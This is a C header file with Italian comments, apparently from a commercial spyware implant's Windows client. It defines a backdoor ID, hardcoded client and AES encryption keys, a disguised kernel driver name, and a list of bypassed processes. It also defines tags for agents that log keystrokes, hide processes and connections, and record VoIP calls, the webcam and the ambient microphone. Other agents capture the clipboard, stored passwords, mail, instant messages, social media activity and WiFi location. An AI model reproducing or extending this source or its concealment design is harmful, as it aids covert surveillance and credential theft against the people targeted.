#include "DynamiCall/prototypes.h"
#include "DynamiCall/dynamic_import.h"

#define DBG_MSG(x) MessageBox(NULL, x, "Debug Message", MB_OK);

#define LOOP for(;;) 
#define CANCELLATION_POINT(x) if(x) { x=FALSE; ExitThread(0); }
#define CANCELLATION_SLEEP_TIME 200
#define CANCELLATION_SLEEP(x, y) for(DWORD slc=0; slc<y; slc+=CANCELLATION_SLEEP_TIME) { Sleep(CANCELLATION_SLEEP_TIME); CANCELLATION_POINT(x); }

#define RET_CANCELLATION_POINT(x) if(x) { x=FALSE; return 0; }

#define QUERY_CANCELLATION(x,y) if (x) { \
	                            y=TRUE; while(y) Sleep(200); \
                                CloseHandle(x); \
								x = 0; }

#define SAFE_CLOSE_HANDLE(x) if (x!=0 && x!=INVALID_HANDLE_VALUE) { CloseHandle(x); x=0; }
#define SAFE_TERMINATEPROCESS(x) if (x) { FNC(TerminateProcess)(x, 0); CloseHandle(x); x=NULL; }
#define SAFE_TERMINATETHREAD(x) if (x) { FNC(TerminateThread)(x,0); CloseHandle(x); x=0; }

#define SAFE_FREE(x)  { if(x) free(x); x = NULL; }
#define ZERO(x,y) memset(x,0,y)
#define READ_DWORD(x,y) x = *((DWORD *)y); y+=4;

#define SMLSIZE 512
#define MEDSIZE 1024

#define SAFE_SYSFREESTR(x) if (x) {SysFreeString(x); x=NULL;}

// Se e' definita, scrive la chiave in RunOnce
//#define RUN_ONCE_KEY

// Parametri per i tentativi di cancellazione/disinstallazione
#define MAX_DELETE_TRY 15
#define DELETE_SLEEP_TIME 150

// Nomi dei file e delle directory generati casualmente
#define MAX_RAND_NAME 24 // Grandezza massima dei nomi generati casualmente
extern char H4DLLNAME[];
extern char H4_CONF_FILE[];
extern char H4_CONF_BU[];
extern char H4_HOME_PATH[];
extern char H4_HOME_DIR[];
extern char H4_CODEC_NAME[];
extern char H4_DUMMY_NAME[];
extern char H4_UPDATE_FILE[];
extern char H4_MOBCORE_NAME[];
extern char H4_MOBZOO_NAME[];
extern char H64DLL_NAME[];
extern char H4DRIVER_NAME[];
extern char REGISTRY_KEY_NAME[];
extern char EXE_INSTALLER_NAME[];

extern BOOL is_demo_version;

#define COMMON_CODEC_NAME "codec"
#define COMMON_UPDATE_NAME "core"
#define COMMON_UPDATE64_NAME "core64"
#define COMMON_RAPI_NAME "rapi"
#define COMMON_SQLITE_NAME "sqlite"
#define COMMON_MOBILE_CORE_NAME "wmcore.001"
#define COMMON_MOBILE_ZOO_NAME "wmcore.002"
#define COMMON_EXE_INSTALLER_NAME "installer"

#define DRIVER_NAME_OLD "MSDRV1.SYS" 
#define DRIVER_NAME_OLD_W L"MSDRV1.SYS"
#define DRIVER_NAME "ndisk.sys" 
#define DRIVER_NAME_W L"ndisk.sys"

// Per controllare il processo Host "social"
#define SOCIAL_PROCESS_CONTINUE 0
#define SOCIAL_PROCESS_PAUSE 1
#define SOCIAL_PROCESS_EXIT 2

// Nome della tag che nei comandi e nei download indica la home
#define HOME_VAR_NAME "$dir$" 
#define HOME_VAR_NAME_W L"$dir$" 

#define EMBEDDED_BYPASS 29  // numero di processi bypassati hardcoded
#define MAX_DYNAMIC_BYPASS 20 // massimo numero dei processi che si possono aggiungere
#define MAX_PBYPASS_LEN 100  // massima lunghezza del nome di un bypass process

#define KEY_LEN 16 // Lunghezza in byte chiave AES
#define BLOCK_LEN 16 // Lunghezza di un blocco di cifratura (per AES)
#define CLEAR_CONF_LEN 8 // Numero di byte in chiaro all'inizio del file di configurazione

#define SHARE_MEMORY_READ_BASENAME "KMS1"
#define SHARE_MEMORY_WRITE_BASENAME "KMS2"
#define SHARE_MEMORY_ASP_COMMAND_BASENAME "KMS3"
#define SHARE_MEMORY_ASP_DATA_BASENAME "KMS4"

// Versione del client 
#define CLIENT_VERSION "2012030601"

// -------- Elementi per il binary patching ---------
// Chiave UNIVOCA fra server e client
//#define CLIENT_KEY "A02H90JL00000000"
#define CLIENT_KEY "f7Hk0f5usd04apdvqw13F5ed25soV5eD"

//#define ENCRYPTION_KEY "ngkdNGKDh4H4883"
#define ENCRYPTION_KEY "3j9WmmDgBqyU270FTid3719g64bP4s52"

//#define ENCRYPTION_KEY_CONF "ngkdNGKDh4H4869"
#define ENCRYPTION_KEY_CONF "Adf5V57gQtyi90wUhpb8Neg56756j87R"

//#define BACKDOOR_ID "RCS_0000000744"
#define BACKDOOR_ID "av3pVck1gb4eR2"

#define DEMO_TAG "hxVtdxJ/Z8LvK3ULSnKRUmLE"

//----------------------------------------------------

#define WRAPPER_MAX_SHARED_MEM 0x40 // Dimensione di un blocco di shared mem dedicato
                                    // alla configurazione di wrapper e agenti.
                                    // Per comodita' li metto tutti uguali.

// Tag dei wrappers e degli agenti
#define PM_CORE	0xFFFF // tag speciale usato dal core

#define WRAPPER_COUNT 14 // XXX Da cambiare quando aggiungo un wrapper
#define PM_FILEAGENT 0x00000000
#define PM_KEYLOGAGENT (PM_FILEAGENT + WRAPPER_MAX_SHARED_MEM) // 0x0040
#define WR_HIDE_PID  (PM_KEYLOGAGENT + WRAPPER_MAX_SHARED_MEM) // 0x0080
#define WR_HIDE_CON  (WR_HIDE_PID + WRAPPER_MAX_SHARED_MEM)    // 0x00C0
#define PM_PRINTAGENT (WR_HIDE_CON + WRAPPER_MAX_SHARED_MEM)   // 0x0100
#define PM_VOIPRECORDAGENT (PM_PRINTAGENT + WRAPPER_MAX_SHARED_MEM) // 0x0140
#define PM_URLLOG (PM_VOIPRECORDAGENT + WRAPPER_MAX_SHARED_MEM)     // 0x0180
#define PM_ONNEWWINDOW_IPC (PM_URLLOG + WRAPPER_MAX_SHARED_MEM)   // 0x01C0
#define PM_CONTACTSAGENT      0x0200
#define PM_DEVICEINFO         0x0240
#define PM_MOUSEAGENT         0x0280
#define PM_CRISISAGENT        0x02C0
#define PM_IMAGENT_SKYPE      0x0300
#define PM_IMAGENT_SOCIAL	  0x0301	// Usato per i log di tipo IM che vengono dall'agente social

#define PM_URLAGENT_SNAP (PM_URLLOG + 1) // Usato per gli snapshot degli url (non e' un agente ma solo un logtype)
#define PM_FILEAGENT_CAPTURE 0x00000001  // (non e' un agente ma solo un logtype)

#define PM_SOCIALAGENT		  0xAAB0
#define PM_SOCIALAGENT_FB	  0xAAB1	// Usato per i file di markup per il modulo facebook dell'agente social
#define PM_AMBMICAGENT        0xC2C2
#define PM_WEBCAMAGENT        0xE9E9
#define PM_CLIPBOARDAGENT     0xD9D9
#define PM_PSTOREAGENT        0xFAFA
#define PM_IMAGENT            0xC6C6
#define PM_MAILAGENT          0x1001      
#define PM_APPLICATIONAGENT   0x1011
#define PM_PDAAGENT           0xDF7A
#define PM_EXPLOREDIR         0xEDA1
#define PM_DOWNLOAD           0xD0D0  
#define PM_WIFILOCATION		  0x1220
#define PM_SNAPSHOTAGENT      0xB9B9 // Ha un valore alto per averlo fra gli ultimi
                                // visto che non dovra' avere una zona di memoria per IPC
                                // (altrimenti occuperei memoria inutilmente)


